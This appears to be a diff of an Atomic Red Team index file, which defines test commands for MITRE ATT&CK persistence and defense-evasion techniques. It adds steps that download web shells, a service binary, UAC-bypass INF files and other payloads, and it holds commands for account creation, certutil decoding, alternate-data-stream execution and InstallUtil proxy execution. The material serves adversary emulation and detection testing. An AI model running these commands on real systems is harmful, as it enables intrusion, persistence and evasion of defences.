@@ -626,6 +626,13 @@ persistence:
           description: Path to the shim databaase file
           type: String
           default: PathToAtomicsFolder\T1138\src\AtomicShimx86.sdb
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Shim database file must exist on disk at specified location (#{file_path})
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/src/AtomicShimx86.sdb" -OutFile "#{file_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -766,7 +773,7 @@ persistence:
           #{local_file}
 
 '
-        cleanup_command: 'del #{local_file}
+        cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -1124,10 +1131,6 @@ persistence:
           description: Username of the user to create
           type: String
           default: evil_user
-        comment:
-          description: Comment to record when creating the user
-          type: String
-          default: Evil Account
       executor:
         name: bash
         elevation_required: true
@@ -1176,10 +1179,14 @@ persistence:
           description: Username of the user to create
           type: String
           default: T1136_CMD
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_CMD!
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'net user /add "#{username}"
+        command: 'net user /add "#{username}" "#{password}"
 
 '
         cleanup_command: 'net user /del "#{username}"
@@ -1345,8 +1352,8 @@ persistence:
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           %APPDATA%\updater.exe -Command exit
         cleanup_command: |
-          del %APPDATA%\updater.exe
-          del %APPDATA%\amsi.dll
+          del %APPDATA%\updater.exe >nul 2>&1
+          del %APPDATA%\amsi.dll >nul 2>&1
   T1519:
     technique:
       x_mitre_permissions_required:
@@ -1611,7 +1618,7 @@ persistence:
         command: |
           echo T1158 > %TEMP%\T1158.txt
           attrib.exe +s %TEMP%\T1158.txt
-        cleanup_command: 'del /A:S %TEMP%\T1158.txt
+        cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
 
 '
     - name: Create Windows Hidden File with Attrib
@@ -1626,7 +1633,7 @@ persistence:
         command: |
           echo T1158_hidden > %TEMP%\T1158_hidden.txt
           attrib.exe +h %TEMP%\T1158_hidden.txt
-        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt
+        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
 
 '
     - name: Hidden files
@@ -1699,7 +1706,7 @@ persistence:
           echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
           for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
-        cleanup_command: 'del #{file_name}
+        cleanup_command: 'del #{file_name} >nul 2>&1
 
 '
     - name: Create ADS PowerShell
@@ -1870,6 +1877,13 @@ persistence:
           description: TLS Server To Test Get Request
           type: Url
           default: https://www.example.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1179x64.dll must exist on disk at specified location (#{file_name})
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll" -OutFile "#{file_name}"
       executor:
         name: powershell
         elevation_required: true
@@ -3083,6 +3097,13 @@ persistence:
           description: Name of the Service
           type: String
           default: AtomicTestService
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Service binary must exist on disk at specified location (#{binary_path})
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -3107,6 +3128,13 @@ persistence:
           description: Name of the Service
           type: String
           default: AtomicTestService
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Service binary must exist on disk at specified location (#{binary_path})
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: powershell
         elevation_required: true
@@ -4323,7 +4351,7 @@ persistence:
       input_arguments:
         weak_service_name:
           description: weak service check
-          type: Registry
+          type: String
           default: weakservicename
       executor:
         name: powershell
@@ -4921,12 +4949,21 @@ persistence:
           description: Path of Web Shell
           type: path
           default: PathToAtomicsFolder\T1100\src\
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Web shell must exist on disk at specified location (#{web_shells})
+        prereq_command: 'if (Test-Path #{web_shells}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
 
 '
-        cleanup_command: 'del #{web_shell_path}
+        cleanup_command: 'del #{web_shell_path} >nul 2>&1
 
 '
   T1084:
@@ -5162,158 +5199,6 @@ persistence:
 
 '
 defense-evasion:
-  T1134:
-    technique:
-      x_mitre_permissions_required:
-      - User
-      - Administrator
-      x_mitre_data_sources:
-      - API monitoring
-      - Access tokens
-      - Process monitoring
-      - Process command-line parameters
-      name: Access Token Manipulation
-      description: "Windows uses access tokens to determine the ownership of a running
-        process. A user can manipulate access tokens to make a running process appear
-        as though it belongs to someone other than the user that started the process.
-        When this occurs, the process also takes on the security context associated
-        with the new token. For example, Microsoft promotes the use of access tokens
-        as a security best practice. Administrators should log in as a standard user
-        but run their tools with administrator privileges using the built-in access
-        token manipulation command <code>runas</code>.(Citation: Microsoft runas)\n
-        \ \nAdversaries may use access tokens to operate under a different user or
-        system security context to perform actions and evade detection. An adversary
-        can use built-in Windows API functions to copy access tokens from existing
-        processes; this is known as token stealing. An adversary must already be in
-        a privileged user context (i.e. administrator) to steal a token. However,
-        adversaries commonly use token stealing to elevate their security context
-        from the administrator level to the SYSTEM level. An adversary can use a token
-        to authenticate to a remote system as the account for that token if the account
-        has appropriate permissions on the remote system.(Citation: Pentestlab Token
-        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
-        methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
-        Impersonation/Theft** - An adversary creates a new access token that duplicates
-        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
-        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
-        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
-        to assign the impersonated token to a thread. This is useful for when the
-        target user has a non-network logon session on the system.\n\n**Create Process
-        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
-        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
-        running under the security context of the impersonated user. This is useful
-        for creating a new process under the security context of a different user.\n\n**Make
-        and Impersonate Token** - An adversary has a username and password but the
-        user is not logged onto the system. The adversary can then create a logon
-        session for the user using the <code>LogonUser</code> function. The function
-        will return a copy of the new session's access token and the adversary can
-        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
-        user can use the <code>runas</code> command, and the Windows API functions,
-        to create impersonation tokens; it does not require access to an administrator
-        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
-        and uses token impersonation to escalate privileges.(Citation: Metasploit
-        access token) The Cobalt Strike beacon payload allows arbitrary token impersonation
-        and can also create tokens. (Citation: Cobalt Strike Access Token)"
-      id: attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      x_mitre_detection: "If an adversary is using a standard command-line shell,
-        analysts can detect token manipulation by auditing command-line activity.
-        Specifically, analysts should look for use of the <code>runas</code> command.
-        Detailed command-line logging is not enabled by default in Windows.(Citation:
-        Microsoft Command-line Logging)\n\nIf an adversary is using a payload that
-        calls the Windows token APIs directly, analysts can detect token manipulation
-        only through careful analysis of user network activity, examination of running
-        processes, and correlation with other endpoint and network behavior. \n\nThere
-        are many Windows API calls a payload can take advantage of to manipulate access
-        tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation:
-        Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation:
-        Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API
-        pages for more information.\n\nQuery systems for process and thread token
-        information and look for inconsistencies such as user owns processes impersonating
-        the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)"
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - Tom Ueltschi @c_APT_ure
-      - Travis Smith, Tripwire
-      - Robby Winchester, @robwinchester3
-      - Jared Atkinson, @jaredcatkinson
-      created: '2017-12-14T16:46:06.044Z'
-      x_mitre_effective_permissions:
-      - SYSTEM
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
-      - kill_chain_name: mitre-attack
-        phase_name: privilege-escalation
-      external_references:
-      - external_id: T1134
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1134
-      - source_name: capec
-        external_id: CAPEC-633
-        url: https://capec.mitre.org/data/definitions/633.html
-      - source_name: Microsoft runas
-        description: Microsoft TechNet. (n.d.). Runas. Retrieved April 21, 2017.
-        url: https://technet.microsoft.com/en-us/library/bb490994.aspx
-      - source_name: Pentestlab Token Manipulation
-        description: netbiosX. (2017, April 3). Token Manipulation. Retrieved April
-          21, 2017.
-        url: https://pentestlab.blog/2017/04/03/token-manipulation/
-      - source_name: BlackHat Atkinson Winchester Token Manipulation
-        description: 'Atkinson, J., Winchester, R. (2017, December 7). A Process is
-          No One: Hunting for Token Manipulation. Retrieved December 21, 2017.'
-        url: https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf
-      - source_name: Metasploit access token
-        description: Offensive Security. (n.d.). What is Incognito. Retrieved April
-          21, 2017.
-        url: https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
-      - source_name: Cobalt Strike Access Token
-        description: Mudge, R. (n.d.). Windows Access Tokens and Alternate Credentials.
-          Retrieved April 21, 2017.
-        url: https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/
-      - source_name: Microsoft Command-line Logging
-        description: Mathers, B. (2017, March 7). Command line process auditing. Retrieved
-          April 21, 2017.
-        url: https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing
-      - source_name: Microsoft LogonUser
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
-      - source_name: Microsoft DuplicateTokenEx
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx
-      - source_name: Microsoft ImpersonateLoggedOnUser
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
-      modified: '2019-10-14T20:45:04.451Z'
-      identifier: T1134
-    atomic_tests:
-    - name: Access Token Manipulation
-      description: |
-        Creates a process as another user
-        Requires Administrator Privileges To Execute Test
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_user:
-          description: Username To Steal Token From
-          type: String
-          default: SYSTEM
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          #list processes by user,
-          $owners = @{}
-          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
-          get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
-
-          #Steal Token
-          Set-Location $PathToAtomicsFolder
-          .\T1134\src\T1134.ps1
   '':
     technique:
       x_mitre_data_sources:
@@ -5476,7 +5361,7 @@ defense-evasion:
           #{local_file}
 
 '
-        cleanup_command: 'del #{local_file}
+        cleanup_command: 'del #{local_file} >nul 2>&1
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -5931,6 +5816,13 @@ defense-evasion:
           description: Path to the INF file
           type: path
           default: PathToAtomicsFolder\T1191\src\T1191.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_file_path})
+        prereq_command: 'if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf" -OutFile "#{inf_file_path}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -5949,6 +5841,13 @@ defense-evasion:
           description: Path to the INF file
           type: path
           default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_file_uac})
+        prereq_command: 'if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf" -OutFile "#{inf_file_uac}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -6146,12 +6045,19 @@ defense-evasion:
       input_arguments:
         input_file:
           description: C# code that launches calc.exe from a hidden cmd.exe Window
-          type: file
-          default: "$PathToAtomicsFolder\\T1500\\src\\calc.cs"
+          type: Path
+          default: PathToAtomicsFolder\T1500\src\calc.cs
         output_file:
           description: Output compiled binary
-          type: file
+          type: Path
           default: C:\Windows\Temp\T1500.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: C# file must exist on disk at specified location (#{input_file})
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1500/src/calc.cs" -OutFile "#{input_file}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -6159,7 +6065,7 @@ defense-evasion:
           #{input_file}
 
 '
-        cleanup_command: 'del #{output_file}'
+        cleanup_command: 'del #{output_file} >nul 2>&1'
   T1223:
     technique:
       x_mitre_data_sources:
@@ -6235,6 +6141,13 @@ defense-evasion:
           description: Local .chm payload
           type: path
           default: PathToAtomicsFolder\T1223\src\T1223.chm
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The payload must exist on disk at specified location (#{local_chm_file})
+        prereq_command: 'if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm" -OutFile "#{local_chm_file}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -6453,6 +6366,13 @@ defense-evasion:
           description: path to cpl file
           type: path
           default: PathToAtomicsFolder\T1196\bin\calc.cpl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Cpl file must exist on disk at specified location (#{cpl_file_path})
+        prereq_command: 'if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1196/bin/calc.cpl" -OutFile "#{cpl_file_path}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -6661,8 +6581,8 @@ defense-evasion:
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           %APPDATA%\updater.exe -Command exit
         cleanup_command: |
-          del %APPDATA%\updater.exe
-          del %APPDATA%\amsi.dll
+          del %APPDATA%\updater.exe >nul 2>&1
+          del %APPDATA%\amsi.dll >nul 2>&1
   T1073:
     technique:
       x_mitre_data_sources:
@@ -6807,8 +6727,8 @@ defense-evasion:
           certutil -encode #{executable} %temp%\T1140_calc.txt
           certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
         cleanup_command: |
-          del %temp%\T1140_calc.txt
-          del %temp%T1140_calc_decoded.exe
+          del %temp%\T1140_calc.txt >nul 2>&1
+          del %temp%T1140_calc_decoded.exe >nul 2>&1
     - name: Certutil Rename and Decode
       description: 'Rename certutil and decode a file. This is in reference to latest
         research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
@@ -6828,8 +6748,8 @@ defense-evasion:
           copy %windir%\system32\certutil.exe %temp%\tcm.tmp
           %temp%\tcm.tmp -decode #{executable} %temp%\T1140.txt
         cleanup_command: |
-          del %temp%\tcm.tmp
-          del %temp%\T1140.txt
+          del %temp%\tcm.tmp >nul 2>&1
+          del %temp%\T1140.txt >nul 2>&1
   T1089:
     technique:
       x_mitre_data_sources:
@@ -7351,7 +7271,7 @@ defense-evasion:
         elevation_required: false
         command: |
           echo "T1107" > %temp%\T1107.txt
-          del /f  %temp%\T1107.txt
+          del /f  %temp%\T1107.txt >nul 2>&1
     - name: Delete an entire folder - Windows cmd
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
@@ -7384,11 +7304,6 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        folder_to_delete:
-          description: Path of folder to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-ps
       executor:
         name: powershell
         elevation_required: false
@@ -8194,7 +8109,7 @@ defense-evasion:
         command: |
           echo T1158 > %TEMP%\T1158.txt
           attrib.exe +s %TEMP%\T1158.txt
-        cleanup_command: 'del /A:S %TEMP%\T1158.txt
+        cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
 
 '
     - name: Create Windows Hidden File with Attrib
@@ -8209,7 +8124,7 @@ defense-evasion:
         command: |
           echo T1158_hidden > %TEMP%\T1158_hidden.txt
           attrib.exe +h %TEMP%\T1158_hidden.txt
-        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt
+        cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
 
 '
     - name: Hidden files
@@ -8282,7 +8197,7 @@ defense-evasion:
           echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
           for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
-        cleanup_command: 'del #{file_name}
+        cleanup_command: 'del #{file_name} >nul 2>&1
 
 '
     - name: Create ADS PowerShell
@@ -8439,10 +8354,6 @@ defense-evasion:
           description: Command to launch calc.exe from a hidden PowerShell Window
           type: String
           default: powershell.exe -WindowStyle hidden calc.exe
-        powershell_process_name:
-          description: Name of the created process
-          type: string
-          default: calc
       executor:
         name: powershell
         elevation_required: false
@@ -9044,48 +8955,536 @@ defense-evasion:
       - Digital Certificate Validation
       identifier: T1118
     atomic_tests:
-    - name: InstallUtil uninstall method call
+    - name: CheckIfInstallable method call
+      description: 'Executes the CheckIfInstallable class constructor runner instead
+        of executing InstallUtil.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: CheckIfInstallable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallHelper method call
+      description: 'Executes the InstallHelper class constructor runner instead of
+        executing InstallUtil.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: InstallHelper
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil class constructor method call
+      description: 'Executes the installer assembly class constructor.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Install method call
+      description: 'Executes the Install Method
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Install_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Uninstall method call - /U variant
